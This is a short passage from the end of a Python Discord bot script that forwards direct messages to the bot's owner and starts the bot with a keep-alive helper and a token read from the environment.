        await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
    await bot.process_commands(message)
    
if __name__ == "__main__":
    keep_alive()
    bot.run(os.environ.get("TOKEN"))
